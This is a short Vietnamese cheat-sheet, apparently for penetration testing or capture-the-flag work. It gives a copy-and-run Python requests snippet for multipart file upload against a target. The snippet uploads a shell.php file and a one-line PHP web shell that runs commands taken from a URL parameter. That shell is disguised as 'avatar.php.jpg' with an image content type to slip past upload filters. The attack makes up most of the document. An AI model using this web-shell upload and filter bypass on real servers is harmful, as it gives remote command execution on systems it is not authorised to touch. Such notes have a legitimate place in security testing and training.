# Upload File (Multipart)

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# 1) Upload thường
with open("shell.php", "rb") as f:
    files = {"file": ("shell.php", f, "application/octet-stream")}
    data = {"submit": "upload"}  # field form phụ
    r = s.post(f"{base}/upload", files=files, data=data, timeout=10)
print(r.status_code, r.text[:200])

# 2) Tự chỉnh filename/content-type để test filter
content = b"<?php system($_GET['cmd']); ?>"
files = {"avatar": ("avatar.php.jpg", content, "image/jpeg")}
r = s.post(f"{base}/upload", files=files, data={"user": "test"}, timeout=10)
print(r.status_code)
```

## Lưu ý nhanh
- `files={"field": (filename, bytes_or_fileobj, content_type)}` là chỗ hay quên nhất.
- Khi dùng `files=`, đừng tự set `Content-Type: multipart/form-data`; requests phải tự thêm boundary.
- So sánh với Burp: đúng field name, filename, content-type, và các field `data` kèm theo.